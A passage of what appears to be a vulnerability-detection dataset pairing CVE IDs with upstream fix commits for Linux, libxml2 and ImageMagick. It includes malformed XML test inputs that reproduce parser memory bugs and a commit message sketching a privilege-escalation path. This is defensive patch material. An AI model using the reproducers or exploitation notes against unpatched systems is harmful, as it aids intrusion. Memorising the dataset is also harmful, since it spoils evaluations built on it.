{\n@@ -680,15 +681,31 @@ static ssize_t macvtap_get_user(struct macvtap_queue *q, struct msghdr *m,\n \tif (unlikely(len < ETH_HLEN))\n \t\tgoto err;\n \n+\terr = -EMSGSIZE;\n+\tif (unlikely(count > UIO_MAXIOV))\n+\t\tgoto err;\n+\n \tif (m && m->msg_control && sock_flag(&q->sk, SOCK_ZEROCOPY))\n \t\tzerocopy = true;\n \n \tif (zerocopy) {\n+\t\t/* Userspace may produce vectors with count greater than\n+\t\t * MAX_SKB_FRAGS, so we need to linearize parts of the skb\n+\t\t * to let the rest of data to be fit in the frags.\n+\t\t */\n+\t\tif (count > MAX_SKB_FRAGS) {\n+\t\t\tcopylen = iov_length(iv, count - MAX_SKB_FRAGS);\n+\t\t\tif (copylen < vnet_hdr_len)\n+\t\t\t\tcopylen = 0;\n+\t\t\telse\n+\t\t\t\tcopylen -= vnet_hdr_len;\n+\t\t}\n \t\t/* There are 256 bytes to be copied in skb, so there is enough\n \t\t * room for skb expand head in case it is used.\n \t\t * The rest buffer is mapped from userspace.\n \t\t */\n-\t\tcopylen = vnet_hdr.hdr_len;\n+\t\tif (copylen < vnet_hdr.hdr_len)\n+\t\t\tcopylen = vnet_hdr.hdr_len;\n \t\tif (!copylen)\n \t\t\tcopylen = GOODCOPY_LEN;\n \t} else\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-16931", "CWE_ID": "119", "category": "security", "commit_id": "e26630548e7d138d2c560844c43820b6767251e3", "commit_message": "From e26630548e7d138d2c560844c43820b6767251e3 Mon Sep 17 00:00:00 2001\nFrom: Nick Wellnhofer <wellnhofer@aevum.de>\nDate: Mon, 5 Jun 2017 15:37:17 +0200\nSubject: [PATCH] Fix handling of parameter-entity references\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nThere were two bugs where parameter-entity references could lead to an\nunexpected change of the input buffer in xmlParseNameComplex and\nxmlDictLookup being called with an invalid pointer.\n\nPercent sign in DTD Names\n=========================\n\nThe NEXTL macro used to call xmlParserHandlePEReference. When parsing\n\"complex\" names inside the DTD, this could result in entity expansion\nwhich created a new input buffer. The fix is to simply remove the call\nto xmlParserHandlePEReference from the NEXTL macro. This is safe because\nno users of the macro require expansion of parameter entities.\n\n- xmlParseNameComplex\n- xmlParseNCNameComplex\n- xmlParseNmtoken\n\nThe percent sign is not allowed in names, which are grammatical tokens.\n\n- xmlParseEntityValue\n\nParameter-entity references in entity values are expanded but this\nhappens in a separate step in this function.\n\n- xmlParseSystemLiteral\n\nParameter-entity references are ignored in the system literal.\n\n- xmlParseAttValueComplex\n- xmlParseCharDataComplex\n- xmlParseCommentComplex\n- xmlParsePI\n- xmlParseCDSect\n\nParameter-entity references are ignored outside the DTD.\n\n- xmlLoadEntityContent\n\nThis function is only called from xmlStringLenDecodeEntities and\nentities are replaced in a separate step immediately after the function\ncall.\n\nThis bug could also be triggered with an internal subset and double\nentity expansion.\n\nThis fixes bug 766956 initially reported by Wei Lei and independently by\nChromium's ClusterFuzz, Hanno Böck, and Marco Grassi. Thanks to everyone\ninvolved.\n\nxmlParseNameComplex with XML_PARSE_OLD10\n========================================\n\nWhen parsing Names inside an expanded parameter entity with the\nXML_PARSE_OLD10 option, xmlParseNameComplex would call xmlGROW via the\nGROW macro if the input buffer was exhausted. At the end of the\nparameter entity's replacement text, this function would then call\nxmlPopInput which invalidated the input buffer.\n\nThere should be no need to invoke GROW in this situation because the\nbuffer is grown periodically every XML_PARSER_CHUNK_SIZE characters and,\nat least for UTF-8, in xmlCurrentChar. This also matches the code path\nexecuted when XML_PARSE_OLD10 is not set.\n\nThis fixes bugs 781205 (CVE-2017-9049) and 781361 (CVE-2017-9050).\nThanks to Marcel Böhme and Thuan Pham for the report.\n\nAdditional hardening\n====================\n\nA separate check was added in xmlParseNameComplex to validate the\nbuffer size.\n---\n Makefile.am                     | 18 ++++++++++++++++++\n parser.c                        | 18 ++++++++++--------\n result/errors10/781205.xml      |  0\n result/errors10/781205.xml.err  | 21 +++++++++++++++++++++\n result/errors10/781361.xml      |  0\n result/errors10/781361.xml.err  | 13 +++++++++++++\n result/valid/766956.xml         |  0\n result/valid/766956.xml.err     |  9 +++++++++\n result/valid/766956.xml.err.rdr | 10 ++++++++++\n runtest.c                       |  3 +++\n test/errors10/781205.xml        |  3 +++\n test/errors10/781361.xml        |  3 +++\n test/valid/766956.xml           |  2 ++\n test/valid/dtds/766956.dtd      |  2 ++\n 14 files changed, 94 insertions(+), 8 deletions(-)\n create mode 100644 result/errors10/781205.xml\n create mode 100644 result/errors10/781205.xml.err\n create mode 100644 result/errors10/781361.xml\n create mode 100644 result/errors10/781361.xml.err\n create mode 100644 result/valid/766956.xml\n create mode 100644 result/valid/766956.xml.err\n create mode 100644 result/valid/766956.xml.err.rdr\n create mode 100644 test/errors10/781205.xml\n create mode 100644 test/errors10/781361.xml\n create mode 100644 test/valid/766956.xml\n create mode 100644 test/valid/dtds/766956.dtd\n\n", "diff_code": "diff --git a/Makefile.am b/Makefile.am\nindex 6fc8ffa9..10e716a5 100644\n--- a/Makefile.am\n+++ b/Makefile.am\n@@ -427,6 +427,24 @@ Errtests : xmllint$(EXEEXT)\n \t      if [ -n \"$$log\" ] ; then echo $$name result ; echo \"$$log\" ; fi ; \\\n \t      rm result.$$name error.$$name ; \\\n \t  fi ; fi ; done)\n+\t@echo \"## Error cases regression tests (old 1.0)\"\n+\t-@(for i in $(srcdir)/test/errors10/*.xml ; do \\\n+\t  name=`basename $$i`; \\\n+\t  if [ ! -d $$i ] ; then \\\n+\t  if [ ! -f $(srcdir)/result/errors10/$$name ] ; then \\\n+\t      echo New test file $$name ; \\\n+\t      $(CHECKER) $(top_builddir)/xmllint --oldxml10 $$i \\\n+\t         2> $(srcdir)/result/errors10/$$name.err \\\n+\t\t > $(srcdir)/result/errors10/$$name ; \\\n+\t      grep \"MORY ALLO\" .memdump  | grep -v \"MEMORY ALLOCATED : 0\"; \\\n+\t  else \\\n+\t      log=`$(CHECKER) $(top_builddir)/xmllint --oldxml10 $$i 2> error.$$name > result.$$name ; \\\n+\t      grep \"MORY ALLO\" .memdump  | grep -v \"MEMORY ALLOCATED : 0\"; \\\n+\t      diff $(srcdir)/result/errors10/$$name result.$$name ; \\\n+\t      diff $(srcdir)/result/errors10/$$name.err error.$$name` ; \\\n+\t      if [ -n \"$$log\" ] ; then echo $$name result ; echo \"$$log\" ; fi ; \\\n+\t      rm result.$$name error.$$name ; \\\n+\t  fi ; fi ; done)\n \t@echo \"## Error cases stream regression tests\"\n \t-@(for i in $(srcdir)/test/errors/*.xml ; do \\\n \t  name=`basename $$i`; \\\ndiff --git a/parser.c b/parser.c\nindex df2efa55..a175ac4e 100644\n--- a/parser.c\n+++ b/parser.c\n@@ -2121,7 +2121,6 @@ static void xmlGROW (xmlParserCtxtPtr ctxt) {\n \tctxt->input->line++; ctxt->input->col = 1;\t\t\t\\\n     } else ctxt->input->col++;\t\t\t\t\t\t\\\n     ctxt->input->cur += l;\t\t\t\t\\\n-    if (*ctxt->input->cur == '%') xmlParserHandlePEReference(ctxt);\t\\\n   } while (0)\n \n #define CUR_CHAR(l) xmlCurrentChar(ctxt, &l)\n@@ -3412,13 +3411,6 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {\n \t    len += l;\n \t    NEXTL(l);\n \t    c = CUR_CHAR(l);\n-\t    if (c == 0) {\n-\t\tcount = 0;\n-\t\tGROW;\n-                if (ctxt->instate == XML_PARSER_EOF)\n-                    return(NULL);\n-\t\tc = CUR_CHAR(l);\n-\t    }\n \t}\n     }\n     if ((len > XML_MAX_NAME_LENGTH) &&\n@@ -3426,6 +3418,16 @@ xmlParseNameComplex(xmlParserCtxtPtr ctxt) {\n         xmlFatalErr(ctxt, XML_ERR_NAME_TOO_LONG, \"Name\");\n         return(NULL);\n     }\n+    if (ctxt->input->cur - ctxt->input->base < len) {\n+        /*\n+         * There were a couple of bugs where PERefs lead to to a change\n+         * of the buffer. Check the buffer size to avoid passing an invalid\n+         * pointer to xmlDictLookup.\n+         */\n+        xmlFatalErr(ctxt, XML_ERR_INTERNAL_ERROR,\n+                    \"unexpected change of input buffer\");\n+        return (NULL);\n+    }\n     if ((*ctxt->input->cur == '\\n') && (ctxt->input->cur[-1] == '\\r'))\n         return(xmlDictLookup(ctxt->dict, ctxt->input->cur - (len + 1), len));\n     return(xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));\ndiff --git a/result/errors10/781205.xml b/result/errors10/781205.xml\nnew file mode 100644\nindex 00000000..e69de29b\ndiff --git a/result/errors10/781205.xml.err b/result/errors10/781205.xml.err\nnew file mode 100644\nindex 00000000..da15c3f7\n--- /dev/null\n+++ b/result/errors10/781205.xml.err\n@@ -0,0 +1,21 @@\n+Entity: line 1: parser error : internal error: xmlParseInternalSubset: error detected in Markup declaration\n+\n+ %a; \n+    ^\n+Entity: line 1: \n+<:0000\n+^\n+Entity: line 1: parser error : DOCTYPE improperly terminated\n+ %a; \n+    ^\n+Entity: line 1: \n+<:0000\n+^\n+namespace error : Failed to parse QName ':0000'\n+ %a; \n+    ^\n+<:0000\n+      ^\n+./test/errors10/781205.xml:4: parser error : Couldn't find end of Start Tag :0000 line 1\n+\n+^\ndiff --git a/result/errors10/781361.xml b/result/errors10/781361.xml\nnew file mode 100644\nindex 00000000..e69de29b\ndiff --git a/result/errors10/781361.xml.err b/result/errors10/781361.xml.err\nnew file mode 100644\nindex 00000000..655f41a2\n--- /dev/null\n+++ b/result/errors10/781361.xml.err\n@@ -0,0 +1,13 @@\n+./test/errors10/781361.xml:4: parser error : xmlParseElementDecl: 'EMPTY', 'ANY' or '(' expected\n+\n+^\n+./test/errors10/781361.xml:4: parser error : internal error: xmlParseInternalSubset: error detected in Markup declaration\n+\n+\n+^\n+./test/errors10/781361.xml:4: parser error : DOCTYPE improperly terminated\n+\n+^\n+./test/errors10/781361.xml:4: parser error : Start tag expected, '<' not found\n+\n+^\ndiff --git a/result/valid/766956.xml b/result/valid/766956.xml\nnew file mode 100644\nindex 00000000..e69de29b\ndiff --git a/result/valid/766956.xml.err b/result/valid/766956.xml.err\nnew file mode 100644\nindex 00000000..34b1dae6\n--- /dev/null\n+++ b/result/valid/766956.xml.err\n@@ -0,0 +1,9 @@\n+test/valid/dtds/766956.dtd:2: parser error : PEReference: expecting ';'\n+%ä%ent;\n+   ^\n+Entity: line 1: parser error : Content error in the external subset\n+ %ent; \n+      ^\n+Entity: line 1: \n+value\n+^\ndiff --git a/result/valid/766956.xml.err.rdr b/result/valid/766956.xml.err.rdr\nnew file mode 100644\nindex 00000000..77603462\n--- /dev/null\n+++ b/result/valid/766956.xml.err.rdr\n@@ -0,0 +1,10 @@\n+test/valid/dtds/766956.dtd:2: parser error : PEReference: expecting ';'\n+%ä%ent;\n+   ^\n+Entity: line 1: parser error : Content error in the external subset\n+ %ent; \n+      ^\n+Entity: line 1: \n+value\n+^\n+./test/valid/766956.xml : failed to parse\ndiff --git a/runtest.c b/runtest.c\nindex b2ce693b..378b38e3 100644\n--- a/runtest.c\n+++ b/runtest.c\n@@ -4214,6 +4214,9 @@ testDesc testDescriptions[] = {\n     { \"Error cases regression tests\",\n       errParseTest, \"./test/errors/*.xml\", \"result/errors/\", \"\", \".err\",\n       0 },\n+    { \"Error cases regression tests (old 1.0)\",\n+      errParseTest, \"./test/errors10/*.xml\", \"result/errors10/\", \"\", \".err\",\n+      XML_PARSE_OLD10 },\n #ifdef LIBXML_READER_ENABLED\n     { \"Error cases stream regression tests\",\n       streamParseTest, \"./test/errors/*.xml\", \"result/errors/\", NULL, \".str\",\ndiff --git a/test/errors10/781205.xml b/test/errors10/781205.xml\nnew file mode 100644\nindex 00000000..d9e9e839\n--- /dev/null\n+++ b/test/errors10/781205.xml\n@@ -0,0 +1,3 @@\n+<!DOCTYPE D [\n+  <!ENTITY % a \"<:0000\">\n+  %a;\ndiff --git a/test/errors10/781361.xml b/test/errors10/781361.xml\nnew file mode 100644\nindex 00000000..67476bcb\n--- /dev/null\n+++ b/test/errors10/781361.xml\n@@ -0,0 +1,3 @@\n+<!DOCTYPE doc [\n+  <!ENTITY % elem \"<!ELEMENT e0000000000\">\n+  %elem;\ndiff --git a/test/valid/766956.xml b/test/valid/766956.xml\nnew file mode 100644\nindex 00000000..19a95a0e\n--- /dev/null\n+++ b/test/valid/766956.xml\n@@ -0,0 +1,2 @@\n+<!DOCTYPE test SYSTEM \"dtds/766956.dtd\">\n+<test/>\ndiff --git a/test/valid/dtds/766956.dtd b/test/valid/dtds/766956.dtd\nnew file mode 100644\nindex 00000000..dddde68b\n--- /dev/null\n+++ b/test/valid/dtds/766956.dtd\n@@ -0,0 +1,2 @@\n+<!ENTITY % ent \"value\">\n+%ä%ent;\n", "owner": "GNOME", "repo": "libxml2", "source": "cve"}
{"CVE_ID": "CVE-2016-10061", "CWE_ID": "20", "category": "security", "commit_id": "4e914bbe371433f0590cefdf3bd5f3a5710069f9", "commit_message": "From 4e914bbe371433f0590cefdf3bd5f3a5710069f9 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Fri, 3 Jun 2016 20:18:07 -0400\nSubject: [PATCH] https://github.com/ImageMagick/ImageMagick/issues/196\n\n---\n coders/tiff.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/coders/tiff.c b/coders/tiff.c\nindex d051e1e666..fa589d94f6 100644\n--- a/coders/tiff.c\n+++ b/coders/tiff.c\n@@ -390,8 +390,10 @@ static Image *ReadGROUP4Image(const ImageInfo *image_info,\n   length=fwrite(\"\\000\\000\\000\\000\",1,4,file);\n   length=WriteLSBLong(file,(long) image->resolution.x);\n   length=WriteLSBLong(file,1);\n+  status=MagickTrue;\n   for (length=0; (c=ReadBlobByte(image)) != EOF; length++)\n-    (void) fputc(c,file);\n+    if (fputc(c,file) != c)\n+      status=MagickFalse;\n   offset=(ssize_t) fseek(file,(ssize_t) offset,SEEK_SET);\n   length=WriteLSBLong(file,(unsigned int) length);\n   (void) fclose(file);\n@@ -413,6 +415,8 @@ static Image *ReadGROUP4Image(const ImageInfo *image_info,\n       (void) CopyMagickString(image->magick,\"GROUP4\",MagickPathExtent);\n     }\n   (void) RelinquishUniqueFileResource(filename);\n+  if (status == MagickFalse)\n+    image=DestroyImage(image);\n   return(image);\n }\n #endif\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2017-15102", "CWE_ID": "476", "category": "security", "commit_id": "2fae9e5a7babada041e2e161699ade2447a01989", "commit_message": "From 2fae9e5a7babada041e2e161699ade2447a01989 Mon Sep 17 00:00:00 2001\nFrom: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nDate: Mon, 19 Sep 2016 19:09:51 +0100\nSubject: [PATCH] usb: misc: legousbtower: Fix NULL pointer deference\n\nThis patch fixes a NULL pointer dereference caused by a race codition in\nthe probe function of the legousbtower driver. It re-structures the\nprobe function to only register the interface after successfully reading\nthe board's firmware ID.\n\nThe probe function does not deregister the usb interface after an error\nreceiving the devices firmware ID. The device file registered\n(/dev/usb/legousbtower%d) may be read/written globally before the probe\nfunction returns. When tower_delete is called in the probe function\n(after an r/w has been initiated), core dev structures are deleted while\nthe file operation functions are still running. If the 0 address is\nmappable on the machine, this vulnerability can be used to create a\nLocal Priviege Escalation exploit via a write-what-where condition by\nremapping dev->interrupt_out_buffer in tower_write. A forged USB device\nand local program execution would be required for LPE. The USB device\nwould have to delay the control message in tower_probe and accept\nthe control urb in tower_open whilst guest code initiated a write to the\ndevice file as tower_delete is called from the error in tower_probe.\n\nThis bug has existed since 2003. Patch tested by emulated device.\n\nReported-by: James Patrick-Evans <james@jmp-e.com>\nTested-by: James Patrick-Evans <james@jmp-e.com>\nSigned-off-by: James Patrick-Evans <james@jmp-e.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers/usb/misc/legousbtower.c | 35 ++++++++++++++++-----------------\n 1 file changed, 17 insertions(+), 18 deletions(-)\n\n", "diff_code": "diff --git a/drivers/usb/misc/legousbtower.c b/drivers/usb/misc/legousbtower.c\nindex ece9b3c1eaac2..c8fbe7b739a0b 100644\n--- a/drivers/usb/misc/legousbtower.c\n+++ b/drivers/usb/misc/legousbtower.c\n@@ -886,24 +886,6 @@ static int tower_probe (struct usb_interface *interface, const struct usb_device\n \tdev->interrupt_in_interval = interrupt_in_interval ? interrupt_in_interval : dev->interrupt_in_endpoint->bInterval;\n \tdev->interrupt_out_interval = interrupt_out_interval ? interrupt_out_interval : dev->interrupt_out_endpoint->bInterval;\n \n-\t/* we can register the device now, as it is ready */\n-\tusb_set_intfdata (interface, dev);\n-\n-\tretval = usb_register_dev (interface, &tower_class);\n-\n-\tif (retval) {\n-\t\t/* something prevented us from registering this driver */\n-\t\tdev_err(idev, \"Not able to get a minor for this device.\\n\");\n-\t\tusb_set_intfdata (interface, NULL);\n-\t\tgoto error;\n-\t}\n-\tdev->minor = interface->minor;\n-\n-\t/* let the user know what node this device is now attached to */\n-\tdev_info(&interface->dev, \"LEGO USB Tower #%d now attached to major \"\n-\t\t \"%d minor %d\\n\", (dev->minor - LEGO_USB_TOWER_MINOR_BASE),\n-\t\t USB_MAJOR, dev->minor);\n-\n \t/* get the firmware version and log it */\n \tresult = usb_control_msg (udev,\n \t\t\t\t  usb_rcvctrlpipe(udev, 0),\n@@ -924,6 +906,23 @@ static int tower_probe (struct usb_interface *interface, const struct usb_device\n \t\t get_version_reply.minor,\n \t\t le16_to_cpu(get_version_reply.build_no));\n \n+\t/* we can register the device now, as it is ready */\n+\tusb_set_intfdata (interface, dev);\n+\n+\tretval = usb_register_dev (interface, &tower_class);\n+\n+\tif (retval) {\n+\t\t/* something prevented us from registering this driver */\n+\t\tdev_err(idev, \"Not able to get a minor for this device.\\n\");\n+\t\tusb_set_intfdata (interface, NULL);\n+\t\tgoto error;\n+\t}\n+\tdev->minor = interface->minor;\n+\n+\t/* let the user know what node this device is now attached to */\n+\tdev_info(&interface->dev, \"LEGO USB Tower #%d now attached to major \"\n+\t\t \"%d minor %d\\n\", (dev->minor - LEGO_USB_TOWER_MINOR_BASE),\n+\t\t USB_MAJOR, dev->minor);\n \n exit:\n \treturn retval;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-16644", "CWE_ID": "20", "category": "security", "commit_id": "16916c8979c32765c542e216b31cee2671b7afe7", "commit_message": "From 16916c8979c32765c542e216b31cee2671b7afe7 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Mon, 27 Aug 2018 19:29:51 -0400\nSubject: [PATCH] https://github.com/ImageMagick/ImageMagick/issues/1269\n\n---\n coders/dcm.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n", "diff_code": "diff --git a/coders/dcm.c b/coders/dcm.c\nindex d44cf80d0a..49a058a2d4 100644\n--- a/coders/dcm.c\n+++ b/coders/dcm.c\n@@ -3853,6 +3853,8 @@ static Image *ReadDCMImage(const ImageInfo *image_info,ExceptionInfo *exception)\n           tag=((unsigned int) ReadBlobLSBShort(image) << 16) |\n             ReadBlobLSBShort(image);\n           length=(size_t) ReadBlobLSBLong(image);\n+          if (length > (size_t) GetBlobSize(image))\n+            ThrowDCMException(CorruptImageError,\"InsufficientImageDataInFile\");\n           if (tag == 0xFFFEE0DD)\n             break; /* sequence delimiter tag */\n           if (tag != 0xFFFEE000)\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2011-4086", "CWE_ID": "119", "category": "security", "commit_id": "15291164b22a357cb211b618adfef4fa82fc0de3", "commit_message": "From 15291164b22a357cb211b618adfef4fa82fc0de3 Mon Sep 17 00:00:00 2001\nFrom: Eric Sandeen <sandeen@redhat.com>\nDate: Mon, 20 Feb 2012 17:53:01 -0500\nSubject: jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head\nstate ala discard_buffer(), but does not touch _Delay or _Unwritten as\ndiscard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume\nthat if they have found a buffer marked unwritten or delay, then it's\na live one.  Perhaps those spots should check whether it is mapped\nas well, but if jbd2 is going to tear down a buffer, let's really\ntear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems\nup until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb\nand 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go\naway, because buried within that large change is some more flag\nclearing.  I still think it's worth doing in jbd2, since\n->invalidatepage leads here directly, and it's the right place\nto clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org\n---\n fs/jbd2/transaction.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n", "diff_code": "diff --git a/fs/jbd2/transaction.c b/fs/jbd2/transaction.c\nindex 35ae096bed5d..526533062548 100644\n--- a/fs/jbd2/transaction.c\n+++ b/fs/jbd2/transaction.c\n@@ -1949,6 +1949,8 @@ zap_buffer_unlocked:\n \tclear_buffer_mapped(bh);\n \tclear_buffer_req(bh);\n \tclear_buffer_new(bh);\n+\tclear_buffer_delay(bh);\n+\tclear_buffer_unwritten(bh);\n \tbh->b_bdev = NULL;\n \treturn may_free;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2010-2943", "CWE_ID": "200", "category": "security", "commit_id": "7124fe0a5b619d65b739477b3b55a20bf805b06d", "commit_message": "From 7124fe0a5b619d65b739477b3b55a20bf805b06d Mon Sep 17 00:00:00 2001\nFrom: Dave Chinner <dchinner@redhat.com>\nDate: Thu, 24 Jun 2010 11:15:33 +1000\nSubject: xfs: validate untrusted inode numbers during lookup\n\nWhen we decode a handle or do a bulkstat lookup, we are using an\ninode number we cannot trust to be valid. If we are deleting inode\nchunks from disk (default noikeep mode), then we cannot trust the on\ndisk inode buffer for any given inode number to correctly reflect\nwhether the inode has been unlinked as the di_mode nor the\ngeneration number may have been updated on disk.\n\nThis is due to the fact that when we delete an inode chunk, we do\nnot write the clusters back to disk when they are removed - instead\nwe mark them stale to avoid them being written back potentially over\nthe top of something that has been subsequently allocated at that\nlocation. The result is that we can have locations of disk that look\nlike they contain valid inodes but in reality do not. Hence we\ncannot simply convert the inode number to a block number and read\nthe location from disk to determine if the inode is valid or not.\n\nAs a result, and XFS_IGET_BULKSTAT lookup needs to actually look the\ninode up in the inode allocation btree to determine if the inode\nnumber is valid or not.\n\nIt should be noted even on ikeep filesystems, there is the\npossibility that blocks on disk may look like valid inode clusters.\ne.g. if there are filesystem images hosted on the filesystem. Hence\neven for ikeep filesystems we really need to validate that the inode\nnumber is valid before issuing the inode buffer read.\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\n---\n fs/xfs/xfs_ialloc.c | 121 +++++++++++++++++++++++++++++++++-------------------\n 1 file changed, 78 insertions(+), 43 deletions(-)\n\n", "diff_code": "diff --git a/fs/xfs/xfs_ialloc.c b/fs/xfs/xfs_ialloc.c\nindex 9d884c127bb9..0c946c8e05da 100644\n--- a/fs/xfs/xfs_ialloc.c\n+++ b/fs/xfs/xfs_ialloc.c\n@@ -1203,6 +1203,63 @@ error0:\n \treturn error;\n }\n \n+STATIC int\n+xfs_imap_lookup(\n+\tstruct xfs_mount\t*mp,\n+\tstruct xfs_trans\t*tp,\n+\txfs_agnumber_t\t\tagno,\n+\txfs_agino_t\t\tagino,\n+\txfs_agblock_t\t\tagbno,\n+\txfs_agblock_t\t\t*chunk_agbno,\n+\txfs_agblock_t\t\t*offset_agbno,\n+\tint\t\t\tflags)\n+{\n+\tstruct xfs_inobt_rec_incore rec;\n+\tstruct xfs_btree_cur\t*cur;\n+\tstruct xfs_buf\t\t*agbp;\n+\txfs_agino_t\t\tstartino;\n+\tint\t\t\terror;\n+\tint\t\t\ti;\n+\n+\terror = xfs_ialloc_read_agi(mp, tp, agno, &agbp);\n+\tif (error) {\n+\t\txfs_fs_cmn_err(CE_ALERT, mp, \"xfs_imap: \"\n+\t\t\t\t\"xfs_ialloc_read_agi() returned \"\n+\t\t\t\t\"error %d, agno %d\",\n+\t\t\t\terror, agno);\n+\t\treturn error;\n+\t}\n+\n+\t/*\n+\t * derive and lookup the exact inode record for the given agino. If the\n+\t * record cannot be found, then it's an invalid inode number and we\n+\t * should abort.\n+\t */\n+\tcur = xfs_inobt_init_cursor(mp, tp, agbp, agno);\n+\tstartino = agino & ~(XFS_IALLOC_INODES(mp) - 1);\n+\terror = xfs_inobt_lookup(cur, startino, XFS_LOOKUP_EQ, &i);\n+\tif (!error) {\n+\t\tif (i)\n+\t\t\terror = xfs_inobt_get_rec(cur, &rec, &i);\n+\t\tif (!error && i == 0)\n+\t\t\terror = EINVAL;\n+\t}\n+\n+\txfs_trans_brelse(tp, agbp);\n+\txfs_btree_del_cursor(cur, XFS_BTREE_NOERROR);\n+\tif (error)\n+\t\treturn error;\n+\n+\t/* for untrusted inodes check it is allocated first */\n+\tif ((flags & XFS_IGET_BULKSTAT) &&\n+\t    (rec.ir_free & XFS_INOBT_MASK(agino - rec.ir_startino)))\n+\t\treturn EINVAL;\n+\n+\t*chunk_agbno = XFS_AGINO_TO_AGBNO(mp, rec.ir_startino);\n+\t*offset_agbno = agbno - *chunk_agbno;\n+\treturn 0;\n+}\n+\n /*\n  * Return the location of the inode in imap, for mapping it into a buffer.\n  */\n@@ -1263,6 +1320,23 @@ xfs_imap(\n \t\treturn XFS_ERROR(EINVAL);\n \t}\n \n+\tblks_per_cluster = XFS_INODE_CLUSTER_SIZE(mp) >> mp->m_sb.sb_blocklog;\n+\n+\t/*\n+\t * For bulkstat and handle lookups, we have an untrusted inode number\n+\t * that we have to verify is valid. We cannot do this just by reading\n+\t * the inode buffer as it may have been unlinked and removed leaving\n+\t * inodes in stale state on disk. Hence we have to do a btree lookup\n+\t * in all cases where an untrusted inode number is passed.\n+\t */\n+\tif (flags & XFS_IGET_BULKSTAT) {\n+\t\terror = xfs_imap_lookup(mp, tp, agno, agino, agbno,\n+\t\t\t\t\t&chunk_agbno, &offset_agbno, flags);\n+\t\tif (error)\n+\t\t\treturn error;\n+\t\tgoto out_map;\n+\t}\n+\n \t/*\n \t * If the inode cluster size is the same as the blocksize or\n \t * smaller we get to the buffer by simple arithmetics.\n@@ -1277,10 +1351,8 @@ xfs_imap(\n \t\treturn 0;\n \t}\n \n-\tblks_per_cluster = XFS_INODE_CLUSTER_SIZE(mp) >> mp->m_sb.sb_blocklog;\n-\n \t/*\n-\t * If we get a block number passed from bulkstat we can use it to\n+\t * If we get a block number passed we can use it to\n \t * find the buffer easily.\n \t */\n \tif (imap->im_blkno) {\n@@ -1304,50 +1376,13 @@ xfs_imap(\n \t\toffset_agbno = agbno & mp->m_inoalign_mask;\n \t\tchunk_agbno = agbno - offset_agbno;\n \t} else {\n-\t\txfs_btree_cur_t\t*cur;\t/* inode btree cursor */\n-\t\txfs_inobt_rec_incore_t chunk_rec;\n-\t\txfs_buf_t\t*agbp;\t/* agi buffer */\n-\t\tint\t\ti;\t/* temp state */\n-\n-\t\terror = xfs_ialloc_read_agi(mp, tp, agno, &agbp);\n-\t\tif (error) {\n-\t\t\txfs_fs_cmn_err(CE_ALERT, mp, \"xfs_imap: \"\n-\t\t\t\t\t\"xfs_ialloc_read_agi() returned \"\n-\t\t\t\t\t\"error %d, agno %d\",\n-\t\t\t\t\terror, agno);\n-\t\t\treturn error;\n-\t\t}\n-\n-\t\tcur = xfs_inobt_init_cursor(mp, tp, agbp, agno);\n-\t\terror = xfs_inobt_lookup(cur, agino, XFS_LOOKUP_LE, &i);\n-\t\tif (error) {\n-\t\t\txfs_fs_cmn_err(CE_ALERT, mp, \"xfs_imap: \"\n-\t\t\t\t\t\"xfs_inobt_lookup() failed\");\n-\t\t\tgoto error0;\n-\t\t}\n-\n-\t\terror = xfs_inobt_get_rec(cur, &chunk_rec, &i);\n-\t\tif (error) {\n-\t\t\txfs_fs_cmn_err(CE_ALERT, mp, \"xfs_imap: \"\n-\t\t\t\t\t\"xfs_inobt_get_rec() failed\");\n-\t\t\tgoto error0;\n-\t\t}\n-\t\tif (i == 0) {\n-#ifdef DEBUG\n-\t\t\txfs_fs_cmn_err(CE_ALERT, mp, \"xfs_imap: \"\n-\t\t\t\t\t\"xfs_inobt_get_rec() failed\");\n-#endif /* DEBUG */\n-\t\t\terror = XFS_ERROR(EINVAL);\n-\t\t}\n- error0:\n-\t\txfs_trans_brelse(tp, agbp);\n-\t\txfs_btree_del_cursor(cur, XFS_BTREE_NOERROR);\n+\t\terror = xfs_imap_lookup(mp, tp, agno, agino, agbno,\n+\t\t\t\t\t&chunk_agbno, &offset_agbno, flags);\n \t\tif (error)\n \t\t\treturn error;\n-\t\tchunk_agbno = XFS_AGINO_TO_AGBNO(mp, chunk_rec.ir_startino);\n-\t\toffset_agbno = agbno - chunk_agbno;\n \t}\n \n+out_map:\n \tASSERT(agbno >= chunk_agbno);\n \tcluster_agbno = chunk_agbno +\n \t\t((offset_agbno / blks_per_cluster) * blks_per_cluster);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
